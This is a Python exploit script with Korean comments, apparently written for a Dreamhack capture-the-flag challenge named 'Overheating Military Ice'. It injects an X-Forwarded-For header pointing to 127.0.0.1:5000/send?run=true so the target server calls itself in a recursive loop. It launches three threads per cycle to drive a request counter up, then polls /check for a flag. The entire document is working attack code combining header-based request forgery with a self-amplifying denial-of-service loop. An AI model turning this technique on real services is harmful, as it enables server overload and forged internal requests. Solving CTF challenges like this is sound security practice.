import requests
import time
import threading
import re

# 타겟 서버 URL (실제 문제 환경에 맞게 포트/주소 수정 필요)
TARGET_URL = "http://host8.dreamhack.games:8649"

def trigger_overheat():
    print(f"\n[DEBUG-ATTACK] 스레드 시작: 서버 과열 유도 공격 시도")
    
    # 핵심 페이로드: 서버가 자기 자신을 계속 호출하도록 만듭니다.
    # Flask 기본 포트가 5000번이므로 127.0.0.1:5000으로 설정합니다.
    payload_ip = "127.0.0.1:5000/send?run=true"
    headers = {
        "X-Forwarded-For": payload_ip
    }
    url = f"{TARGET_URL}/send?run=true"
    
    print(f"[DEBUG-ATTACK] 대상 URL: {url}")
    print(f"[DEBUG-ATTACK] 주입할 헤더: {headers}")
    
    try:
        print(f"[DEBUG-ATTACK] 악성 GET 요청 전송 중... (재귀 루프가 시작되면 Timeout이 발생할 수 있습니다)")
        # 서버 내부에서 연쇄 반응이 일어나므로 응답이 늦거나 타임아웃 날 수 있습니다.
        response = requests.get(url, headers=headers, timeout=3)
        print(f"[DEBUG-ATTACK] 서버 응답 수신 성공! HTTP 상태 코드: {response.status_code}")
    except requests.exceptions.Timeout:
        print(f"[DEBUG-ATTACK] 예상된 Timeout 발생! 서버 내부에서 무한 재귀 공격(루프)이 성공적으로 돌고 있을 확률이 높습니다.")
    except Exception as e:
        print(f"[DEBUG-ATTACK] 예외(Error) 발생: {str(e)}")

def check_system_status():
    print(f"\n[DEBUG-MONITOR] 서버 과열 상태(Count) 확인 중...")
    url = f"{TARGET_URL}/check"
    
    try:
        response = requests.get(url, timeout=5)
        print(f"[DEBUG-MONITOR] 상태 확인 응답 코드: {response.status_code}")
        
        # 플래그 탈취 확인 (SP{...})
        if "SP{" in response.text:
            print(f"\n==================================================")
            print(f"[+] 🎯 성공! 시스템 과열 완료! 플래그를 획득했습니다!")
            for line in response.text.split('\n'):
                if "SP{" in line:
                    # 플래그가 있는 줄을 깔끔하게 출력합니다.
                    clean_flag = re.sub('<[^<]+>', '', line).strip()
                    print(f"[+] FLAG: {clean_flag}")
            print(f"==================================================\n")
            return True
        else:
            # 현재 과열 수치(Count) 파싱
            match = re.search(r"(\d+) / 220913 Requests", response.text)
            if match:
                current_count = match.group(1)
                print(f"[DEBUG-MONITOR] 현재 서버 요청 처리량: {current_count} / 220913")
            else:
                print(f"[DEBUG-MONITOR] 카운트 정보를 파싱할 수 없습니다. (HTML 구조 확인 필요)")
    except Exception as e:
        print(f"[DEBUG-MONITOR] 상태 확인 중 에러 발생: {str(e)}")
        
    return False

if __name__ == "__main__":
    print("[DEBUG-MAIN] === Overheating Military Ice 익스플로잇 스크립트 시작 ===")
    print("[DEBUG-MAIN] 타겟 서버:", TARGET_URL)
    
    attempt = 1
    while True:
        print(f"\n[DEBUG-MAIN] --- 공격 사이클 #{attempt} ---")
        
        # 1. 상태 먼저 확인
        is_done = check_system_status()
        if is_done:
            print("[DEBUG-MAIN] 플래그를 찾았으므로 스크립트를 정상 종료합니다.")
            break
            
        # 2. 공격 스레드 실행 (재귀가 끊길 것을 대비해 여러 번 트리거)
        print("[DEBUG-MAIN] 공격 스레드 3개 생성 및 실행 (다중 트리거)")
        threads = []
        for i in range(3):
            t = threading.Thread(target=trigger_overheat)
            threads.append(t)
            t.start()
            
        # 스레드 종료 대기
        for t in threads:
            t.join()
            
        print("[DEBUG-MAIN] 연쇄 반응이 누적되도록 잠시 대기 (2초)...")
        time.sleep(2)
        attempt += 1